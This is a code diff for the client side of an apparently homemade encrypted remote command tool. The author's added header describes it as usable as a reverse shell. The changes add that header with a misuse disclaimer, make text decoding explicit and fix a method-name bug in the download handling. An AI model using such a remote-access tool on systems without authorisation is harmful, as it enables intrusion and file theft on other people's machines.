@@ -1,6 +1,17 @@
 #!/usr/bin/env python3
 
 from modules.comms import secure_send, recv_data, cget_pubkey
+#!/usr/bin/env python3
+
+"""
+Author: Sean Brady
+Date: 08/12/2022
+
+ATTENTION/CAUTION
+I AM NOT RESPONSIBLE FOR ANY USER MISUSE OF THE CODE IN THIS REPOSITORY!
+If you're using it as a reverse shell, only hack your own system/systems you have legal authority to use/pentest
+"""
+
 import nacl.utils
 from nacl.public import PrivateKey, Box
 import pickle
@@ -41,10 +52,9 @@ class ClientService(object):
 
 			return cwd
 		else:
-			# result = pickle.loads(response) # pickled encoding
 			# When you change directories, the server sends back the 'Changed Direcotry' informationa and then the actual path
-			print(response[0].decode())
-			cwd = response[1].decode()
+			print(response[0].decode('utf-8'))
+			cwd = response[1].decode('utf-8')
 			return cwd
 
 	def upload(self, upload_file):
@@ -123,7 +133,7 @@ class ClientService(object):
 				
 				if cmd_split[0] == "download":
 					# For when we get a FileNotFound Error since the error is not sent through pickle serialization
-						self.download(response, cmd_split[1].cmd_split('/')[-1])
+						self.download(response, cmd_split[1].split('/')[-1])
 				else:
 					cwd = self.output_data(response, cwd)
 
